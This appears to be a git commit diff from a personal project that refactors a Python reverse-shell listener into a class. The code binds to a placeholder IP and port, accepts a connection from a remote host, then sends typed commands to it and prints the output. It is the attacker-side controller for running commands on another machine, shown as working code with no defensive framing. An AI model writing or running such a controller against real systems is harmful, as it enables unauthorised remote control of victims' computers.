6558daa3e962f416e94c60f91d43cd9e7f526677
Diego Gramond <diego.pegramm@gmail.com>
2024-09-19 00:27:44 -0600

    Refactored the listener to a class

--- listener.py
+++ listener.py
@@ -2,17 +2,25 @@
 
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("YOUR_IP", PORT))
-listener.listen(0)
-print("[-] Waiting for incoming connections")
-con, address = listener.accept()
-print(f"[+] Connected with {str(address[0])}")
+
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[-] Waiting for incoming connections")
+        self.con, address = listener.accept()
+        print(f"[+] Connected with {str(address[0])}")
 
 
-while True:
-    command = input(">> ")
-    con.send(command.encode())
-    result = con.recv(1024).decode()
-    print(result)
+    def run(self):
+        while True:
+            command = input(">> ")
+            self.con.send(command.encode())
+            result = self.con.recv(1024).decode()
+            print(result)
+
+
+listener = Listener("YOUR_IP", PORT)
+listener.run()
